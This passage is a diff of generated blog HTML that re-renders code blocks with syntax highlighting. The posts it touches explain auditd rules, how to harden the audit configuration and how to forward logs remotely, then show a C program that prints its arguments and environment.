+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">42</span><span class="o">-</span><span class="n">injection</span><span class="o">.</span><span class="n">rules</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">43</span><span class="o">-</span><span class="n">module</span><span class="o">-</span><span class="nb">load</span><span class="o">.</span><span class="n">rules</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">70</span><span class="o">-</span><span class="n">einval</span><span class="o">.</span><span class="n">rules</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">71</span><span class="o">-</span><span class="n">networking</span><span class="o">.</span><span class="n">rules</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">99</span><span class="o">-</span><span class="n">finalize</span><span class="o">.</span><span class="n">rules</span>
+</span></span></code></pre></div><p><em>( <strong>NOTE:</strong> The numbers in the filenames play a very important role. For auditd, the first rule found wins. So if there are 2 contradictory rules, the first one found will be applied and the second one will have no effect.)</em></p>
 <p>You can copy these rules, or just the ones you want to monitor, to <code>/etc/audit/rules.d/</code> folder and restart the service to pick up the new rules. Or you can use <code>augenrules --load</code> to load them without restarting the service.</p>
 <h3 id="hardening-the-audit">Hardening the audit</h3>
 <p>First step to harden the audit will be to ensude auditd&rsquo;s configuration is immutable. This can be done with <code>-e 2</code> control rule. Enabling this will prevent further changes in auditd&rsquo;s configurations. This being said, it is very obvious that this should be the last rule in the list.</p>
@@ -1207,18 +1207,18 @@ No rules
 <p><em>This package was not already installed on my system so I installed it with <code>sudo yum install -y audispd-plugins</code>. Once this is installed, <code>auditsp-remote.conf</code> will be there witing for you to edit.</em></p>
 <p>There are a few configuration changes you&rsquo;ll need to make to ensure that logs are sent to the remote server. The overall concept is to collect logs using auditd, then use a plugin to send logs to a central server while also disabling local logging of the same logs. This way, we won&rsquo;t have logs on the local system (saving disk space), and we can aggregate logs from multiple servers for analysis.</p>
 <p>Let&rsquo;s start it with one change at a time. First one will be to enable the remote logging plugin. To do that, we can make changes to <code>/etc/audisp/plugins.d/au-remote.conf</code>.</p>
-<pre tabindex="0"><code>## CHANGE active status to yes
-
-active=yes
-</code></pre><p>Then let our audit dispatcher know about the remote server where we want to dispatch the logs. This change will be made to <code>/etc/audisp/audisp-remote.conf</code></p>
-<pre tabindex="0"><code>## Remote server name/IP and the port
-remote_server = 192.168.56.10
-port = 60
-</code></pre><p><em>As a dirty trick, I&rsquo;ve started netcat on port 60 to listen to the incoming data from the host.</em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">## CHANGE active status to yes
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">active=yes
+</span></span></code></pre></div><p>Then let our audit dispatcher know about the remote server where we want to dispatch the logs. This change will be made to <code>/etc/audisp/audisp-remote.conf</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">## Remote server name/IP and the port
+</span></span><span class="line"><span class="cl">remote_server = 192.168.56.10
+</span></span><span class="line"><span class="cl">port = 60
+</span></span></code></pre></div><p><em>As a dirty trick, I&rsquo;ve started netcat on port 60 to listen to the incoming data from the host.</em></p>
 <p>Last thing is to disable the local logging for <code>auditd</code>. For that, make changes to <code>/etc/audit/auditd.conf</code>.</p>
-<pre tabindex="0"><code>## CHANGE write logs to no
-write_logs = no
-</code></pre><p>With this done, you have everything configured and ready to test. Now restart the <strong>auditd</strong> service and you&rsquo;ll start getting logs in netcat screen on remote system.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">## CHANGE write logs to no
+</span></span><span class="line"><span class="cl">write_logs = no
+</span></span></code></pre></div><p>With this done, you have everything configured and ready to test. Now restart the <strong>auditd</strong> service and you&rsquo;ll start getting logs in netcat screen on remote system.</p>
 <h2 id="wrap-up">Wrap-up</h2>
 <p>In this article, you learnt about how to do better auditing of your linux environment, with the help of <code>auditd</code>. You also learnt about how to write your own rules or get pre-packaged rules to generate specific audit logs&hellip; and ways to get required reports with the help of <code>ausearch</code> and <code>aureport</code> programs.</p>
 <p>This article is not intended to be a complete guide for auditing. It&rsquo;s whole purpose is to get you started with the idea of auditing and using the <code>audit</code> package utilities.</p>
@@ -1473,42 +1473,42 @@ To get a better understanding of how that happens in linux, we need to understan
 </span></span></code></pre></div><p>The above code will print out the argc, argv and envp values to the standard output.</p>
 <p><strong>Compile it</strong> : <code>gcc not_hello_world.c -o not_hello_world.o</code></p>
 <p><strong>Check file type</strong> : <code>file not_hello_world.o</code></p>
-<pre tabindex="0"><code>not_hello_world.o: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=82cad832f6d9b9a2d071be6bca3ccab87c8c71f6, for GNU/Linux 3.2.0, not stripped
-</code></pre><p><strong>Run it</strong> : <code>./not_hello_world.o 12345 123 12345678901234567890 1234</code></p>
-<pre tabindex="0"><code class="language-output" data-lang="output">Argument count :  5
-Arguments list :
-	argv[0] =[ 0x7ffd3bd9370c ]==&gt; ./not_hello_world.o
-	argv[1] =[ 0x7ffd3bd93720 ]==&gt; 12345
-	argv[2] =[ 0x7ffd3bd93726 ]==&gt; 123
-	argv[3] =[ 0x7ffd3bd9372a ]==&gt; 12345678901234567890
-	argv[4] =[ 0x7ffd3bd9373f ]==&gt; 1234
-Environment list :
-	envp[0] =[ 0x7ffd3bd93744 ]==&gt; SHELL=/bin/bash
-	envp[1] =[ 0x7ffd3bd93754 ]==&gt; LANGUAGE=en_US:
-	envp[2] =[ 0x7ffd3bd93764 ]==&gt; PWD=/home/vagrant/workspace/blog_junk
-	envp[3] =[ 0x7ffd3bd9378a ]==&gt; LOGNAME=vagrant
-	envp[4] =[ 0x7ffd3bd9379a ]==&gt; XDG_SESSION_TYPE=tty
-	envp[5] =[ 0x7ffd3bd937af ]==&gt; MOTD_SHOWN=pam
-	envp[6] =[ 0x7ffd3bd937be ]==&gt; HOME=/home/vagrant
-	envp[7] =[ 0x7ffd3bd937d1 ]==&gt; LANG=en_US.UTF-8
-	envp[8] =[ 0x7ffd3bd937e2 ]==&gt; LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
-	envp[9] =[ 0x7ffd3bd93dc4 ]==&gt; SSH_CONNECTION=10.0.2.2 34954 10.0.2.15 22
-	envp[10] =[ 0x7ffd3bd93def ]==&gt; LESSCLOSE=/usr/bin/lesspipe %s %s
-	envp[11] =[ 0x7ffd3bd93e11 ]==&gt; XDG_SESSION_CLASS=user
-	envp[12] =[ 0x7ffd3bd93e28 ]==&gt; TERM=tmux-256color
-	envp[13] =[ 0x7ffd3bd93e3b ]==&gt; LESSOPEN=| /usr/bin/lesspipe %s
-	envp[14] =[ 0x7ffd3bd93e5b ]==&gt; USER=vagrant
-	envp[15] =[ 0x7ffd3bd93e68 ]==&gt; SHLVL=1
-	envp[16] =[ 0x7ffd3bd93e70 ]==&gt; XDG_SESSION_ID=6
-	envp[17] =[ 0x7ffd3bd93e81 ]==&gt; XDG_RUNTIME_DIR=/run/user/1000
-	envp[18] =[ 0x7ffd3bd93ea0 ]==&gt; SSH_CLIENT=10.0.2.2 34954 22
-	envp[19] =[ 0x7ffd3bd93ebd ]==&gt; XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
-	envp[20] =[ 0x7ffd3bd93efe ]==&gt; PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
-	envp[21] =[ 0x7ffd3bd93f66 ]==&gt; DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
-	envp[22] =[ 0x7ffd3bd93f9c ]==&gt; SSH_TTY=/dev/pts/0
-	envp[23] =[ 0x7ffd3bd93faf ]==&gt; _=./not_hello_world.o
-	envp[24] =[ 0x7ffd3bd93fc5 ]==&gt; OLDPWD=/home/vagrant/workspace
-</code></pre><p>This still does not gives us what is happening behind the scenes, but it tells us that each program has some dedicated memory space where it stores a copy of arguments and environment variables in <strong>continuous memory locations</strong>. To gather more information we can use the <a href="https://www.man7.org/linux/man-pages/man1/strace.1.html"><code>strace</code></a> utility to trace the system calls made by our program.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">not_hello_world.o: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=82cad832f6d9b9a2d071be6bca3ccab87c8c71f6, for GNU/Linux 3.2.0, not stripped
+</span></span></code></pre></div><p><strong>Run it</strong> : <code>./not_hello_world.o 12345 123 12345678901234567890 1234</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">Argument</span> <span class="n">count</span> <span class="p">:</span>  <span class="mi">5</span>
+</span></span><span class="line"><span class="cl"><span class="n">Arguments</span> <span class="n">list</span> <span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd9370c</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="o">./</span><span class="n">not_hello_world</span><span class="o">.</span><span class="n">o</span>
+</span></span><span class="line"><span class="cl">	<span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93720</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="mi">12345</span>
+</span></span><span class="line"><span class="cl">	<span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93726</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="mi">123</span>
+</span></span><span class="line"><span class="cl">	<span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd9372a</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="mi">12345678901234567890</span>
+</span></span><span class="line"><span class="cl">	<span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd9373f</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="mi">1234</span>
+</span></span><span class="line"><span class="cl"><span class="ne">Environment</span> <span class="n">list</span> <span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93744</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">SHELL</span><span class="o">=/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93754</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">LANGUAGE</span><span class="o">=</span><span class="n">en_US</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93764</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">PWD</span><span class="o">=/</span><span class="n">home</span><span class="o">/</span><span class="n">vagrant</span><span class="o">/</span><span class="n">workspace</span><span class="o">/</span><span class="n">blog_junk</span>
+</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd9378a</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">LOGNAME</span><span class="o">=</span><span class="n">vagrant</span>
+</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd9379a</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">XDG_SESSION_TYPE</span><span class="o">=</span><span class="n">tty</span>
+</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd937af</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">MOTD_SHOWN</span><span class="o">=</span><span class="n">pam</span>
+</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd937be</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">HOME</span><span class="o">=/</span><span class="n">home</span><span class="o">/</span><span class="n">vagrant</span>
+</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd937d1</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">LANG</span><span class="o">=</span><span class="n">en_US</span><span class="o">.</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
+</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd937e2</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">LS_COLORS</span><span class="o">=</span><span class="n">rs</span><span class="o">=</span><span class="mi">0</span><span class="p">:</span><span class="n">di</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">34</span><span class="p">:</span><span class="n">ln</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="n">mh</span><span class="o">=</span><span class="mi">00</span><span class="p">:</span><span class="n">pi</span><span class="o">=</span><span class="mi">40</span><span class="p">;</span><span class="mi">33</span><span class="p">:</span><span class="n">so</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="k">do</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="n">bd</span><span class="o">=</span><span class="mi">40</span><span class="p">;</span><span class="mi">33</span><span class="p">;</span><span class="mi">01</span><span class="p">:</span><span class="n">cd</span><span class="o">=</span><span class="mi">40</span><span class="p">;</span><span class="mi">33</span><span class="p">;</span><span class="mi">01</span><span class="p">:</span><span class="ow">or</span><span class="o">=</span><span class="mi">40</span><span class="p">;</span><span class="mi">31</span><span class="p">;</span><span class="mi">01</span><span class="p">:</span><span class="n">mi</span><span class="o">=</span><span class="mi">00</span><span class="p">:</span><span class="n">su</span><span class="o">=</span><span class="mi">37</span><span class="p">;</span><span class="mi">41</span><span class="p">:</span><span class="n">sg</span><span class="o">=</span><span class="mi">30</span><span class="p">;</span><span class="mi">43</span><span class="p">:</span><span class="n">ca</span><span class="o">=</span><span class="mi">30</span><span class="p">;</span><span class="mi">41</span><span class="p">:</span><span class="n">tw</span><span class="o">=</span><span class="mi">30</span><span class="p">;</span><span class="mi">42</span><span class="p">:</span><span class="n">ow</span><span class="o">=</span><span class="mi">34</span><span class="p">;</span><span class="mi">42</span><span class="p">:</span><span class="n">st</span><span class="o">=</span><span class="mi">37</span><span class="p">;</span><span class="mi">44</span><span class="p">:</span><span class="n">ex</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">32</span><span class="p">:</span><span class="o">*.</span><span class="n">tar</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">tgz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">arc</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">arj</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">taz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">lha</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">lz4</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">lzh</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">lzma</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">tlz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">txz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">tzo</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">t7z</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">zip</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">z</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">dz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">gz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">lrz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">lz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">lzo</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">xz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">zst</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">tzst</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">bz2</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">bz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">tbz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">tbz2</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">tz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">deb</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">rpm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">jar</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">war</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">ear</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">sar</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">rar</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">alz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">ace</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">zoo</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">cpio</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="mi">7</span><span class="n">z</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">rz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">cab</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">wim</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">swm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">dwm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">esd</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">jpg</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">jpeg</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">mjpg</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">mjpeg</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">gif</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">bmp</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">pbm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">pgm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">ppm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">tga</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">xbm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">xpm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">tif</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">tiff</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">png</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">svg</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">svgz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">mng</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">pcx</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">mov</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">mpg</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">mpeg</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">m2v</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">mkv</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">webm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">ogm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">mp4</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">m4v</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">mp4v</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">vob</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">qt</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">nuv</span><span 